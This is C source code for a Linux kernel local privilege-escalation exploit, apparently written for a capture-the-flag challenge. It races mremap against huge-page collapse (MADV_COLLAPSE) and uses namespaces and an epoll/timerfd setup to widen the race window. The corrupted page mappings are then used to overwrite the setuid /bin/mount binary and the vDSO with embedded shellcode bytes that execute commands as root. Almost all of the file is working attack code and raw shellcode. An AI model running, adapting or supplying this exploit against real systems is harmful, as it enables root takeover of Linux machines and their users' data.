#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/epoll.h>
#include <sys/resource.h>

#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/timerfd.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...)                                                         \
  dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                         \
  dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,        \
          __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                         \
  dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,       \
          __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                         \
  dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,          \
          __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                                                          \
  do {                                                                         \
    loge(fmt, ##__VA_ARGS__);                                                  \
    loge("Exit at line %d", __LINE__);                                         \
    exit(1);                                                                   \
  } while (0)

static void pin_to(int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &cset))
    err(1, "set affinity");
}

int timefds[0x1000];
int epfds[0x1000];
char buf[0x1000];
int tfd;

size_t timeout = 50;

#ifndef MADV_COLLAPSE
#define MADV_COLLAPSE 25
#endif

#define SYSCHK(x)                                                              \
  ({                                                                           \
    typeof(x) __res = (x);                                                     \
    if (__res == (typeof(x))-1)                                                \
      err(1, "SYSCHK(" #x ")");                                                \
    __res;                                                                     \
  })

static void write_file(char *name, char *buf) {
  int fd = SYSCHK(open(name, O_WRONLY));
  if (write(fd, buf, strlen(buf)) != strlen(buf))
    err(1, "write %s", name);
  close(fd);
}

static void write_map(char *name, int outer_id) {
  char buf[100];
  sprintf(buf, "0 %d 1", outer_id);
  write_file(name, buf);
}

#define SPINLOCK(cmp)                                                          \
  while (cmp) {                                                                \
    usleep(10 * 1000);                                                         \
  }

// Structure to hold memory region information
typedef struct {
  unsigned long start;
  unsigned long end;
  char permissions[5]; // e.g., "r-xp"
  char pathname[256];
} mem_region_t;

/**
 * Parses a line from /proc/<PID>/maps and fills the mem_region_t structure.
 * Returns 1 on success, 0 on failure.
 */
int parse_map_line(const char *line, mem_region_t *region) {
  // Initialize pathname to empty string
  region->pathname[0] = '\0';

  // Example line format:
  // 7ffd071f2000-7ffd071f6000 r--p 00000000 00:00 0 [vdso]
  int fields = sscanf(line, "%lx-%lx %4s %*s %*s %*s %255[^\n]", &region->start,
                      &region->end, region->permissions, region->pathname);
  if (fields < 4) {
    // If pathname is missing, set it to empty
    region->pathname[0] = '\0';
  }
  return 1;
}

static void epoll_ctl_add(int epfd, int fd, uint32_t events) {
  struct epoll_event ev;
  ev.events = events;
  ev.data.fd = fd;
  SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev));
}

void do_epoll_enqueue(int fd) {
  int cfd[2];
  socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
  for (int k = 0; k < 0x4; k++) {
    if (fork() == 0) {
      for (int i = 0; i < 0x200; i++) {
        timefds[i] = dup(fd);
      }
      for (int i = 0; i < 0x100; i++) {
        epfds[i] = epoll_create(0x1);
      }
      for (int i = 0; i < 0x100; i++) {
        for (int j = 0; j < 0x200; j++) {
          // queue as many as possible async waiters at timerfd waitqueue
          epoll_ctl_add(epfds[i], timefds[j], 0);
        }
      }
      write(cfd[1], buf, 1);
      raise(SIGSTOP); // stop here for nothing and just keep epoll alive
    }
    // sync to make sure it has queue what we need
    read(cfd[0], buf, 1);
  }
  close(cfd[0]);
  close(cfd[1]);
}

/**
 * Retrieves the [vdso] memory region address range for a given process.
 *
 * @param pid         Process ID of the target process.
 * @param start_addr  Pointer to store the start address of [vdso].
 * @param end_addr    Pointer to store the end address of [vdso].
 * @return            0 on success, -1 on failure.
 */
int parse_vdso_start_end(pid_t pid, unsigned long *start_addr,
                         unsigned long *end_addr) {
  char maps_path[256];
  FILE *maps_file = NULL;
  char line[512];
  mem_region_t region;
  int found = 0;

  if (start_addr == NULL || end_addr == NULL) {
    fprintf(stderr, "Invalid address pointers provided.\n");
    return -1;
  }

  // Construct path to /proc/<PID>/maps
  snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

  // Open /proc/<PID>/maps
  maps_file = fopen(maps_path, "r");
  if (!maps_file) {
    fprintf(stderr, "Error opening %s: %m\n", maps_path);
    return -1;
  }

  // Parse /proc/<PID>/maps to find [vdso]
  while (fgets(line, sizeof(line), maps_file)) {
    if (strstr(line, "[vdso]")) {
      parse_map_line(line, &region);
      found = 1;
      break;
    }
  }

  fclose(maps_file);

  if (!found) {
    fprintf(stderr, "Failed to find [vdso] region in /proc/%d/maps\n", pid);
    return -1;
  }

  *start_addr = region.start;
  *end_addr = region.end;

  return 0;
}

#include <linux/perf_event.h>
static long perf_event_open(struct perf_event_attr *hw_event, pid_t pid,
                            int cpu, int group_fd, unsigned long flags) {
  return syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

/* Structure to represent the perf buffer */
struct perf_buffer {
  void *base;
  struct perf_event_mmap_page *metadata;
  uint64_t *data;
  size_t size;
  size_t head;
  size_t tail;
};

void DumpHex(const void *data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

#define PMD_PG_SIZE (0x1000 / 8 * 0x1000)
#define HIJACK_PROCESS_MREMAP_ADDR 0x40000000
#define HIJACK_PROCESS_MMAP_ADDR 0x200000
#define VICTIM_PROCESS_MREMAP_ADDR 0x60000000
#define VICTIM_PROCESS_MMAP_ADDR 0x2000000
#define NO_CRASH_PFN (0x488 / 8)
#define MMAP_SUID_PFN (0x80)
#define MMAP_VDSO_PFN (0xc0)
enum { HIJACK_PROCESS, VICTIM_PROCESS };
int corrupted_pid_idx = 0, corrupted_pids[2] = {};
int now_child_pid;
int tmp_file_fd;
size_t mremap_addrs[2] = {HIJACK_PROCESS_MREMAP_ADDR,
                          VICTIM_PROCESS_MREMAP_ADDR};
size_t mmap_addrs[2] = {HIJACK_PROCESS_MMAP_ADDR, VICTIM_PROCESS_MMAP_ADDR};

void hijack_suid_and_vdso(int signum);
void mmap_suid_and_vdso(int signum);

typedef void (*signal_handler_t)(int);
signal_handler_t do_bad_handlers[] = {hijack_suid_and_vdso, mmap_suid_and_vdso};

void found_victim_handler(int signum) {
  corrupted_pids[corrupted_pid_idx++] = now_child_pid;
  puts("GOOD RACE");
  return;
}
void job_done_handler(int signum) {
  puts("GOOD JOB");
  return;
}
void hijack_suid_and_vdso(int signum) {
  logd("hijack suid");
  mprotect((void *)(HIJACK_PROCESS_MREMAP_ADDR + MMAP_SUID_PFN * 0x1000),
           0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
  // strcpy((void *)(HIJACK_PROCESS_MREMAP_ADDR + MMAP_SUID_PFN * 0x1000),
  //        "Hacked by nightu");
  // system("/bin/sh");

  /*
  stage_suid = asm(shellcraft.execve('/bin/cat', ['cat', '/flag'], 0))
  stage_suid += asm(shellcraft.sleep(10000))
  stage_suid = [i for i in stage_suid]
  */
  unsigned char suid_elf[] = {
      0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
      0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      49,   255,  49,   210,  49,   246,  106,  117,  88,   15,   5,    72,
      184,  1,    1,    1,    1,    1,    1,    1,    1,    80,   72,   184,
      46,   99,   104,  111,  46,   114,  105,  1,    72,   49,   4,    36,
      72,   137,  231,  104,  63,   39,   51,   1,    129,  52,   36,   1,
      1,    1,    1,    72,   184,  116,  32,   47,   102,  108,  97,   103,
      32,   80,   72,   184,  1,    1,    1,    1,    1,    1,    1,    1,
      80,   72,   184,  114,  105,  1,    44,   98,   1,    98,   96,   72,
      49,   4,    36,   49,   246,  86,   106,  14,   94,   72,   1,    230,
      86,   106,  19,   94,   72,   1,    230,  86,   106,  24,   94,   72,
      1,    230,  86,   72,   137,  230,  49,   210,  106,  59,   88,   15,
      5,    106,  1,    254,  12,   36,   104,  17,   38,   1,    1,    129,
      52,   36,   1,    1,    1,    1,    72,   137,  231,  49,   246,  106,
      35,   88,   15,   5,    0xeb, 0xfe};
  memcpy(HIJACK_PROCESS_MREMAP_ADDR + MMAP_SUID_PFN * 0x1000, suid_elf,
         sizeof(suid_elf));
  logd("hijack vdso");
  unsigned long vdso_start = 0, vdso_end = 0;
  parse_vdso_start_end(getpid(), &vdso_start, &vdso_end);
  mprotect((void *)(HIJACK_PROCESS_MREMAP_ADDR + MMAP_VDSO_PFN * 0x1000),
           vdso_end - vdso_start, PROT_READ | PROT_WRITE | PROT_EXEC);
  /*
  stage_vdso = asm(shellcraft.execve('/bin/sh', ['sh', '-c', 'id >&2 &&
  /chroot/bin/mount >&2'], 0))

  stage_vdso += asm(shellcraft.sleep(10000))

  stage_vdso = [i for i in stage_vdso]
  */
  unsigned char vdso_shellcode[] = {
      72,  184, 1,   1,   1,    1,   1,   1,   1,   1,   80,  72,  184, 46,
      99,  104, 111, 46,  114,  105, 1,   72,  49,  4,   36,  72,  137, 231,
      72,  184, 1,   1,   1,    1,   1,   1,   1,   1,   80,  72,  184, 117,
      33,  63,  39,  51,  1,    1,   1,   72,  49,  4,   36,  72,  184, 98,
      105, 110, 47,  109, 111,  117, 110, 80,  72,  184, 47,  99,  104, 114,
      111, 111, 116, 47,  80,   72,  184, 32,  62,  38,  50,  32,  38,  38,
      32,  80,  72,  184, 1,    1,   1,   1,   1,   1,   1,   1,   80,  72,
      184, 114, 105, 1,   44,   98,  1,   104, 101, 72,  49,  4,   36,  49,
      246, 86,  106, 14,  94,   72,  1,   230, 86,  106, 19,  94,  72,  1,
      230, 86,  106, 24,  94,   72,  1,   230, 86,  72,  137, 230, 49,  210,
      106, 59,  88,  15,  5,    106, 1,   254, 12,  36,  104, 17,  38,  1,
      1,   129, 52,  36,  1,    1,   1,   1,   72,  137, 231, 49,  246, 106,
      35,  88,  15,  5,   0xeb, 0xfe};

  memcpy((void *)(HIJACK_PROCESS_MREMAP_ADDR + MMAP_VDSO_PFN * 0x1000 + 0xd94),
         vdso_shellcode, sizeof(vdso_shellcode));
  memset((void *)(HIJACK_PROCESS_MREMAP_ADDR + MMAP_VDSO_PFN * 0x1000 + 0x650),
         '\x90', 0xd94 - 0x650);
  DumpHex((void *)(HIJACK_PROCESS_MREMAP_ADDR + MMAP_VDSO_PFN * 0x1000), 0x100);
  sleep(10000);
}

void mmap_suid_and_vdso(int signum) {
  logd("mmap suid");
  int suid_fd = open("/bin/mount", O_RDONLY);
  SYSCHK(mmap((void *)(VICTIM_PROCESS_MREMAP_ADDR + MMAP_SUID_PFN * 0x1000),
              0x1000, PROT_READ, MAP_SHARED | MAP_FIXED, suid_fd, 0));
  DumpHex((void *)(VICTIM_PROCESS_MREMAP_ADDR + MMAP_SUID_PFN * 0x1000), 0x10);
  logd("mmap vdso");
  unsigned long vdso_start = 0, vdso_end = 0;
  parse_vdso_start_end(getpid(), &vdso_start, &vdso_end);
  SYSCHK(mremap((void *)vdso_start, vdso_end - vdso_start,
                vdso_end - vdso_start, MREMAP_FIXED | MREMAP_MAYMOVE,
                VICTIM_PROCESS_MREMAP_ADDR + MMAP_VDSO_PFN * 0x1000));
  for (size_t i = VICTIM_PROCESS_MREMAP_ADDR + MMAP_VDSO_PFN * 0x1000;
       i < VICTIM_PROCESS_MREMAP_ADDR + MMAP_VDSO_PFN * 0x1000 + vdso_end -
               vdso_start;
       i += 0x1000) {
    DumpHex((void *)i, 0x10);
  }
  kill(getppid(), SIGUSR2);
  sleep(10000);
}

int main(int argc, char **argv) {
  if (argc > 1) {
    timeout = atoi(argv[1]);
  } else {
    timeout = 200;
  }
  logd("timeout %ld", timeout);

  struct sigaction sa;
  sa.sa_handler = found_victim_handler;
  sa.sa_flags = 0;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) == -1) {
    perror("sigaction failed");
    exit(EXIT_FAILURE);
  }
  sa.sa_handler = job_done_handler;
  sa.sa_flags = 0;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR2, &sa, NULL) == -1) {
    perror("sigaction failed");
    exit(EXIT_FAILURE);
  }

  srand(time(NULL));

  // alarm(10);
  setbuf(stdout, 0);
  setbuf(stderr, 0);

  // set up new mount ns for tmpfs with THP
  int outer_uid = getuid();
  int outer_gid = getgid();
  SYSCHK(unshare(CLONE_NEWNS | CLONE_NEWUSER));
  SYSCHK(mount(NULL, "/", NULL, MS_PRIVATE | MS_REC, NULL));
  write_file("/proc/self/setgroups", "deny");
  write_map("/proc/self/uid_map", outer_uid);
  write_map("/proc/self/gid_map", outer_gid);

  // make tmpfs with THP
  SYSCHK(mount("none", "/tmp", "tmpfs", MS_NOSUID | MS_NODEV, "huge=advise"));

  struct rlimit rlim = {.rlim_cur = 0x1000, .rlim_max = 0x1000};
  SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));

  pin_to(1);

  // init a timerfd for extend the race windows
  tfd = timerfd_create(CLOCK_MONOTONIC, 0);
  do_epoll_enqueue(tfd);
  tmp_file_fd = open("/tmp/dump", O_CREAT | O_RDWR, 0644);

  while (1) {
    if (corrupted_pid_idx >= 2)
      break;
    size_t mmap_addr_now = mmap_addrs[corrupted_pid_idx],
           mremap_addr_now = mremap_addrs[corrupted_pid_idx];
    pin_to(0);
    int fd = SYSCHK(open("/tmp/a", O_RDWR | O_CREAT, 0600));
    void *ptr =
        SYSCHK(mmap((void *)mmap_addr_now, PMD_PG_SIZE, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_FIXED_NOREPLACE, fd, 0));
    SYSCHK(ftruncate(fd, 0x1000));
    *((volatile char *)ptr) = 'a';
    SYSCHK(ftruncate(fd, PMD_PG_SIZE));
    SYSCHK(madvise(ptr, PMD_PG_SIZE, MADV_HUGEPAGE));
    close(fd);
    SYSCHK(unlink("/tmp/a"));

    now_child_pid = SYSCHK(fork());
    if (now_child_pid == 0) {
      struct sigaction sa;
      sa.sa_handler = do_bad_handlers[corrupted_pid_idx];
      sa.sa_flags = 0; // 可以使用 SA_RESTART 以自动重启被中断的系统调用
      sigemptyset(&sa.sa_mask);
      if (sigaction(SIGUSR1, &sa, NULL) == -1) {
        perror("sigaction failed");
        exit(EXIT_FAILURE);
      }

      pin_to(1);
      for (int i = 0; i < 512; i++)
        ((volatile char *)ptr)[0x1000 * i] = 'a';

      struct itimerspec new = {.it_value.tv_nsec = timeout};
      SYSCHK(timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL));

      /* race (outer side, will be preempted) */
      SYSCHK(mremap((void *)mmap_addr_now, PMD_PG_SIZE, PMD_PG_SIZE,
                    MREMAP_MAYMOVE | MREMAP_FIXED, (void *)mremap_addr_now));

      for (int i = 0; i < 16 * 0x200; i++) {
        mprotect((void *)(mremap_addr_now + NO_CRASH_PFN * 0x1000), 0x1000,
                 PROT_READ | PROT_WRITE);
        pwrite(tmp_file_fd, (void *)(mremap_addr_now + NO_CRASH_PFN * 0x1000),
               4, 0);
        int dump_cont = 0x61;
        pread(tmp_file_fd, &dump_cont, 4, 0);
        if (dump_cont != 0x61) {
          puts("[Victim process] found!");
          puts("[Victim process] found!");
          puts("[Victim process] found!");
          kill(getppid(), SIGUSR1);
          sleep(100000);
        }
      }
      return 0;
    }

    for (int i = 0; i < 512; i++)
      ((volatile char *)ptr)[0x1000 * i] = 'a';

    usleep(10);
    /* race (inner side, will preempt after timer and voluntary resched) */
    int madv_res = madvise(ptr, PMD_PG_SIZE, MADV_COLLAPSE);
    if (madv_res == -1)
      fprintf(stderr, "_");

    int wstatus;
    if (waitpid(now_child_pid, &wstatus, 0) < 0) {
      puts("RETURNED FROM SIGNAL");
    }

    SYSCHK(munmap(ptr, PMD_PG_SIZE));

    fprintf(stderr, ".");
  }

  logd("WE NOW HAVE TWO PAGE POINTER TO ONE pid1 %d pid2 %d", corrupted_pids[0],
       corrupted_pids[1]);
  logd("DO MMAP");
  kill(corrupted_pids[VICTIM_PROCESS], SIGUSR1);
  int wstatus;
  waitpid(corrupted_pids[VICTIM_PROCESS], &wstatus, 0);
  puts("RETURNED FROM SIGNAL");
  kill(corrupted_pids[HIJACK_PROCESS], SIGUSR1);
  sleep(1000);
}